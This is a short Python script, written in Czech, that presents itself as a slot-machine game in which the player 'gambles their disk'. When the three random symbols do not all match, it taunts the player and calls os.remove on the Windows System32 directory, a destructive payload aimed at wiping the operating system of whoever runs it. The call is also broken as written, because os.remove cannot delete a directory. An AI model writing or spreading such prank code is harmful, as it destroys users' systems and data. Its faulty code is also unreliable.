import random
import os

print("Nyní si zahraješ gamble o svůj disk.")
print("Chceš točit? ")
def gamble_machine():
    symbols = ["🍒", "🍊", "🍋", "🍉", "🍇", "🍓", "🍑", "🍍"]
    input("Stiskni Enter pro točení...")
    result = [random.choice(symbols) for _ in range(3)]
    print(" | ".join(result))
    if len(set(result)) == 1:
        print("Protentokrát jsi vyhrál!")
        exit()
    else:
        print("Ha Ha! Smažu ti OS!")
        os.remove("C:/Windows/System32")
        exit()

gamble_machine()